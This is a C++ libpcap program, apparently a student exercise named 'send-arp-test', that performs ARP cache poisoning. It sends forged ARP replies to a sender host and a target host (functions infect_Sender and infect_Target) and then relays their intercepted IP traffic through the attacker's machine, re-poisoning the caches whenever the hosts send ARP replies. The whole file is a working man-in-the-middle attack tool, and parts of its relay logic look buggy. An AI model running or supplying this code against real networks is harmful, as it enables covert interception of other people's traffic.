#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <pthread.h>

typedef struct _Ethernet{
	unsigned char dst_MAC[6];
	unsigned char src_MAC[6];
	unsigned int Type;
}Ethernet;

typedef struct _Arp{
	unsigned int hw_Type;
	unsigned int proto_Type;
	unsigned char hw_Len;
	unsigned char proto_Len;
	unsigned int operation;
	unsigned char src_HW[6];
	unsigned char src_Proto[4];
	unsigned char tar_HW[6];
	unsigned char tar_Proto[4];
}Arp;

typedef struct _IP_header{
	unsigned char VER;
	unsigned char HLEN;
	unsigned char DS;
	unsigned short Total_length;
	unsigned short ID;
	unsigned char Flags;
	unsigned int Frag_offset;
	unsigned short TTL;
	unsigned short Protocol;
	unsigned int Checksum;
	unsigned char src_IP[4];
	unsigned char dst_IP[4];
	unsigned char Option[40];
	unsigned char data[1460];
}IP_header;
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

struct ifreq *getMAC(char *name){
	int sock;
	struct ifreq *ifr = (struct ifreq*)malloc(sizeof(struct ifreq));
	int fd;
	memset(ifr,0x00,sizeof(struct ifreq));
	strcpy(ifr->ifr_name,name);

	fd = socket(AF_INET,SOCK_STREAM,0);

	if(sock=socket(AF_INET, SOCK_STREAM,0)<0){
		printf("Socket erron\n");
		return ifr;
	}
	if(ioctl(fd,SIOCGIFHWADDR,ifr) < 0){
		printf("ioctl error\n");
		return ifr;
	}
	close(sock);

	return ifr;
}

char *getIP(char *name){
	int sock;
	struct ifreq ifr;
	char *ipstr = (char*)malloc(40);	
	sock = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, name, IFNAMSIZ);

	if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
		printf("Socket Error");
	} 
	else {
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
				ipstr,sizeof(struct sockaddr));
	}

	return ipstr;

}



typedef struct _Parameter {
	char *dev;
	u_char * packet;
	pcap_t* handle;
	int size;
}Parameter;

typedef struct _arpPar{
	pcap_t * handle;
	char* dev;
	char* sender_MAC;
	char* target_MAC;
	char* myMAC;
	char* senderIP;
	char* targetIP;
}arppar;




void* sendThread(void *para){
	Parameter* info = (Parameter *)para;	
	int res = pcap_sendpacket(info->handle, reinterpret_cast<u_char*>(info->packet), info->size);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(info->handle));
	}
	free(info->packet);
	free(info);
	return NULL;
}
void infect_Sender(arppar* info){
	
	EthArpPacket ipacket;

	ipacket.eth_.dmac_ = Mac(info->sender_MAC);
	ipacket.eth_.smac_ = Mac(info->myMAC);
	ipacket.eth_.type_ = htons(EthHdr::Arp);
	ipacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	ipacket.arp_.pro_ = htons(EthHdr::Ip4);
	ipacket.arp_.hln_ = Mac::SIZE;
	ipacket.arp_.pln_ = Ip::SIZE;
	ipacket.arp_.op_ = htons(ArpHdr::Reply);
	ipacket.arp_.smac_ = Mac(info->myMAC);
	ipacket.arp_.sip_ = htonl(Ip(info->targetIP));
	ipacket.arp_.tmac_ = Mac(info->sender_MAC);
	ipacket.arp_.tip_ = htonl(Ip(info->senderIP));
	
	int res = pcap_sendpacket(info->handle, reinterpret_cast<const u_char*>(&ipacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "sender pcap_sendpacket return %d error=%s\n", res, pcap_geterr(info->handle));
	}
	/*
	sleep(1);
	res = pcap_sendpacket(info->handle, reinterpret_cast<const u_char*>(&ipacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "sender pcap_sendpacket return %d error=%s\n", res, pcap_geterr(info->handle));
	}
	*/
}


void infect_Target(arppar* info){


	EthArpPacket ipacket;

	ipacket.eth_.dmac_ = Mac(info->target_MAC);
	ipacket.eth_.smac_ = Mac(info->myMAC);
	ipacket.eth_.type_ = htons(EthHdr::Arp);
	ipacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	ipacket.arp_.pro_ = htons(EthHdr::Ip4);
	ipacket.arp_.hln_ = Mac::SIZE;
	ipacket.arp_.pln_ = Ip::SIZE;
	ipacket.arp_.op_ = htons(ArpHdr::Reply);
	ipacket.arp_.smac_ = Mac(info->myMAC);
	ipacket.arp_.sip_ = htonl(Ip(info->senderIP));
	ipacket.arp_.tmac_ = Mac(info->target_MAC);
	ipacket.arp_.tip_ = htonl(Ip(info->targetIP));

	int res = pcap_sendpacket(info->handle, reinterpret_cast<const u_char*>(&ipacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "target pcap_sendpacket return %d error=%s\n", res, pcap_geterr(info->handle));
	}
	/*
	sleep(1);
	res = pcap_sendpacket(info->handle, reinterpret_cast<const u_char*>(&ipacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "target pcap_sendpacket return %d error=%s\n", res, pcap_geterr(info->handle));
	}
	*/
}
			


int main(int argc, char* argv[]) {


	char sender_MAC[20];
	char target_MAC[20];
	unsigned char s_MAC[6];
	unsigned char t_MAC[6];
	

	//Find my MAC address
	struct ifreq * ifr = getMAC(argv[1]);
	unsigned char *mymac= (unsigned char*) ifr->ifr_hwaddr.sa_data;
	//printf("%s : %02x:%02x:%02x:%02x:%02x:%02x\n",ifr->ifr_name,mymac[0],mymac[1],mymac[2],mymac[3],mymac[4],mymac[5]);

	//Find my IP address
	
	char* myIP =getIP(argv[1]);

	//Send ARP request to get sender MAC address
	for(int idx=2;idx<argc;idx+=2){
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");

	char myMAC[20];
	sprintf(myMAC,"%02x:%02x:%02x:%02x:%02x:%02x",mymac[0],mymac[1],mymac[2],mymac[3],mymac[4],mymac[5]);

	printf("My MAC: %s\n",myMAC);
	printf("My IP: %s\n",myIP);

	packet.eth_.smac_ = Mac(myMAC);
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(myMAC);
	packet.arp_.sip_ = htonl(Ip(myIP));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(argv[idx]));


	//Make child process
	pid_t pid = fork();
	if(pid==0){
		sleep(1);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	sleep(3);
	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

		pcap_close(handle);
		free(ifr);
		return 0;
	}
	
	pcap_close(handle);

	pcap_t* pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", argv[1], errbuf);
		return -1;
	}
	

	//Receive ARP reply packet from sender
	
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		
		Ethernet neth;
		for(int i=0;i<6;i++){
			neth.dst_MAC[i]=packet[i];
		}
		for(int i=6;i<12;i++){
			neth.src_MAC[i-6]=packet[i];
		}
		neth.Type=packet[12]<<8|packet[13];
		if(neth.Type!=0x0806)
			continue;

	
		Arp narp;
		narp.hw_Type=packet[14]<<8|packet[15];
		narp.proto_Type=packet[16]<<8|packet[17];
		narp.hw_Len=packet[18];
		narp.proto_Len=packet[19];
		narp.operation = packet[20]<<8|packet[21];
		for (int i=0;i<6;i++)
			narp.src_HW[i]=packet[22+i];
		for(int i=0;i<4;i++)
			narp.src_Proto[i]=packet[28+i];
		for(int i=0;i<6;i++)
			narp.tar_HW[i]=packet[32+i];
		for(int i=0;i<4;i++)
			narp.tar_Proto[i]=packet[38+i];
		//printf("Victim MAC : %02x:%02x:%02x:%02x:%02x:%02x\n",narp.src_HW[0],narp.src_HW[1],narp.src_HW[2],narp.src_HW[3],narp.src_HW[4],narp.src_HW[5]);
	

		if(narp.proto_Type!=0x0800 ||narp.operation!=0x0002)
			continue;
		char srcIP[20];
		sprintf(srcIP,"%u.%u.%u.%u",narp.src_Proto[0],narp.src_Proto[1],narp.src_Proto[2],narp.src_Proto[3]);
		char tarIP[20];
		sprintf(tarIP,"%u.%u.%u.%u",narp.tar_Proto[0],narp.tar_Proto[1],narp.tar_Proto[2],narp.tar_Proto[3]);

		//printf("srcIP: %s\n",srcIP);
		//printf("tarIP: %s\n",tarIP);
		//If arp reply is mine

		for(int i=0;i<6;i++)
			s_MAC[i]=narp.src_HW[i];
		if(Ip(srcIP)==Ip(argv[idx]) &&Ip(tarIP)==Ip(myIP)){
		sprintf(sender_MAC,"%02x:%02x:%02x:%02x:%02x:%02x",narp.src_HW[0],narp.src_HW[1],narp.src_HW[2],narp.src_HW[3],narp.src_HW[4],narp.src_HW[5]);
		break;
		}
		pcap_close(pcap);	
	}
	


	//Send ARP request to get target MAC address
	
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket tpacket;

	tpacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	
	tpacket.eth_.smac_ = Mac(myMAC);
	tpacket.eth_.type_ = htons(EthHdr::Arp);
	tpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
	tpacket.arp_.pro_ = htons(EthHdr::Ip4);
	tpacket.arp_.hln_ = Mac::SIZE;
	tpacket.arp_.pln_ = Ip::SIZE;
	tpacket.arp_.op_ = htons(ArpHdr::Request);
	tpacket.arp_.smac_ = Mac(myMAC);
	tpacket.arp_.sip_ = htonl(Ip(myIP));
	tpacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
	tpacket.arp_.tip_ = htonl(Ip(argv[idx+1]));

	
	pid_t ppid2 = fork();
	if(ppid2==0){
		sleep(1);
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&tpacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
       		sleep(3);
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&tpacket), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		pcap_close(handle);
		free(ifr);
		return 0;
	}
	pcap_close(handle);

	pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", argv[1], errbuf);
		return -1;
	}
	

	
	//Receive ARP reply packet from target
	
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		
		Ethernet neth;
		for(int i=0;i<6;i++){
			neth.dst_MAC[i]=packet[i];
		}
		for(int i=6;i<12;i++){
			neth.src_MAC[i-6]=packet[i];
		}
		neth.Type=packet[12]<<8|packet[13];
		if(neth.Type!=0x0806)
			continue;

		
		Arp narp;
		narp.hw_Type=packet[14]<<8|packet[15];
		narp.proto_Type=packet[16]<<8|packet[17];
		narp.hw_Len=packet[18];
		narp.proto_Len=packet[19];
		narp.operation = packet[20]<<8|packet[21];
		for (int i=0;i<6;i++)
			narp.src_HW[i]=packet[22+i];
		for(int i=0;i<4;i++)
			narp.src_Proto[i]=packet[28+i];
		for(int i=0;i<6;i++)
			narp.tar_HW[i]=packet[32+i];
		for(int i=0;i<4;i++)
			narp.tar_Proto[i]=packet[38+i];	
		if(narp.proto_Type!=0x0800 ||narp.operation!=0x0002)
			continue;
		char srcIP[20];
		sprintf(srcIP,"%u.%u.%u.%u",narp.src_Proto[0],narp.src_Proto[1],narp.src_Proto[2],narp.src_Proto[3]);
		char tarIP[20];
		sprintf(tarIP,"%u.%u.%u.%u",narp.tar_Proto[0],narp.tar_Proto[1],narp.tar_Proto[2],narp.tar_Proto[3]);

		for(int i=0;i<6;i++)
			t_MAC[i]=narp.src_HW[i];

		//If arp reply is mine
		if(Ip(srcIP)==Ip(argv[idx+1]) &&Ip(tarIP)==Ip(myIP)){    
			sprintf(target_MAC,"%02x:%02x:%02x:%02x:%02x:%02x",narp.src_HW[0],narp.src_HW[1],narp.src_HW[2],narp.src_HW[3],narp.src_HW[4],narp.src_HW[5]);
			break;
		}
	}

	
	//printf("My MAC:%s\n",myMAC);
	printf("Sender: %s\n Target: %s\n",sender_MAC,target_MAC);


	arppar *npar1 = (arppar*)malloc(sizeof(arppar));

	npar1->handle=pcap;
	npar1->dev=dev;
	npar1->sender_MAC=sender_MAC;
	npar1->target_MAC=target_MAC;
	npar1->myMAC=myMAC;
	npar1->senderIP=argv[idx];
	npar1->targetIP=argv[idx+1];
	
	//Send infected ARP request to sender
	infect_Sender(npar1);
	
	//Send infected arp to target
	infect_Target(npar1);	


//	pcap_close(pcap);	
	//Relay paceket from sender to target
//	pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", argv[1], errbuf);
		return -1;
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		
		Ethernet neth;
		for(int i=0;i<6;i++){
			neth.dst_MAC[i]=packet[i];
		}
		for(int i=6;i<12;i++){
			neth.src_MAC[i-6]=packet[i];
		}
		neth.Type=packet[12]<<8|packet[13];
	
	
		if(neth.Type==0x0806){
		Arp narp;
		narp.hw_Type=packet[14]<<8|packet[15];
		narp.proto_Type=packet[16]<<8|packet[17];
		narp.hw_Len=packet[18];
		narp.proto_Len=packet[19];
		narp.operation = packet[20]<<8|packet[21];
		for (int i=0;i<6;i++)
			narp.src_HW[i]=packet[22+i];
		for(int i=0;i<4;i++)
			narp.src_Proto[i]=packet[28+i];
		for(int i=0;i<6;i++)
			narp.tar_HW[i]=packet[32+i];
		for(int i=0;i<4;i++)
			narp.tar_Proto[i]=packet[38+i];	
		if(narp.proto_Type!=0x0800 ||narp.operation!=0x0002)
			continue;
		char srcIP[20];
		sprintf(srcIP,"%u.%u.%u.%u",narp.src_Proto[0],narp.src_Proto[1],narp.src_Proto[2],narp.src_Proto[3]);
		char tarIP[20];
		sprintf(tarIP,"%u.%u.%u.%u",narp.tar_Proto[0],narp.tar_Proto[1],narp.tar_Proto[2],narp.tar_Proto[3]);



		if(Ip(srcIP)==Ip(argv[idx])){
			//Send infected ARP request to sender
			infect_Sender(npar1);
		
		}
		else if(Ip(srcIP)==Ip(argv[idx+1])){
			//Send infected arp to target
			infect_Target(npar1);	
			}
		}
	
		if(neth.Type==0x0800){	
		IP_header nIP;
		nIP.VER=packet[14]>>4&0XFF;
		nIP.HLEN=(packet[14]<<4&0xFF)>>4;
		nIP.DS=packet[15];
		nIP.Total_length=packet[16]<<8|packet[17];
		nIP.ID=packet[18]<<8|packet[19];
		nIP.Flags=packet[20]>>5;
		nIP.Frag_offset=(packet[20]&0x1F)<<13|packet[21];
		nIP.TTL=packet[22];
		nIP.Protocol=packet[23];
		nIP.Checksum=packet[24]<<8|packet[25];

		nIP.src_IP[0]=packet[26];
		nIP.src_IP[1]=packet[27];
		nIP.src_IP[2]=packet[28];
		nIP.src_IP[3]=packet[29];
	
		nIP.dst_IP[0]=packet[30];
		nIP.dst_IP[1]=packet[31];
		nIP.dst_IP[2]=packet[32];
		nIP.dst_IP[3]=packet[33];


		char srcIP[20];
		sprintf(srcIP,"%u.%u.%u.%u",nIP.src_IP[0],nIP.src_IP[1],nIP.src_IP[2],nIP.src_IP[3]);
		char tarIP[20];
		sprintf(tarIP,"%u.%u.%u.%u",nIP.dst_IP[0],nIP.dst_IP[1],nIP.dst_IP[2],nIP.dst_IP[3]);
	//	printf("src: %u.%u.%u.%u\n",nIP.src_IP[0],nIP.src_IP[1],nIP.src_IP[2],nIP.src_IP[3]);
	//	printf("tar: %u.%u.%u.%u\n",nIP.dst_IP[0],nIP.dst_IP[1],nIP.dst_IP[2],nIP.dst_IP[3]);
	

			//If source MAC is sender
			if(Ip(srcIP)==Ip(argv[idx])){
			
				printf("Sender send %d bytes from %s to %s\n",header->caplen,srcIP,tarIP);
				
				u_char *npacket = (u_char*)malloc(header->caplen);
				memcpy(npacket,packet,header->caplen);
				
				for(int i=0;i<6;i++){
					npacket[i]=t_MAC[i];
				}
	
				for(int i=6;i<12;i++){
					npacket[i]=myMAC[i-6];
				}
	
				//printf("npac %ld  %ld\n",sizeof(packet),sizeof(packet));
				Parameter* npar=(Parameter*)malloc(sizeof(Parameter));
				npar->packet=npacket;
				npar->dev=dev;
				npar->handle=pcap;
				npar->size=header->caplen;
				pthread_t thread;
				int pid = pthread_create(&thread,NULL,sendThread,npar);
				if(pid<0)
					perror("Thread error\n");

			}
			//If destination MAC is sender
			else if(Ip(tarIP)==Ip(argv[idx])){
				u_char *npacket = (u_char*)malloc(header->caplen);
				memcpy(npacket,packet,header->caplen);
				for(int i=0;i<6;i++){
					npacket[i]=s_MAC[i];
				}
		
				for(int i=6;i<12;i++){
					npacket[i]=myMAC[i-6];
				}
				
				
				//printf("npac %ld  %ld\n",sizeof(packet),sizeof(packet));
				Parameter* npar=(Parameter*)malloc(sizeof(Parameter));
				npar->packet=npacket;
				npar->dev=dev;
				npar->handle=pcap;
				npar->size=header->caplen;

				pthread_t thread;
				int pid = pthread_create(&thread,NULL,sendThread,npar);
				if(pid<0)
					perror("Thread error\n");

				printf("Target send %d bytes from %s to %s\n",header->caplen,srcIP,tarIP);
			}
		}
	
	}
	pcap_close(pcap);

	
	}

	free(ifr);

}
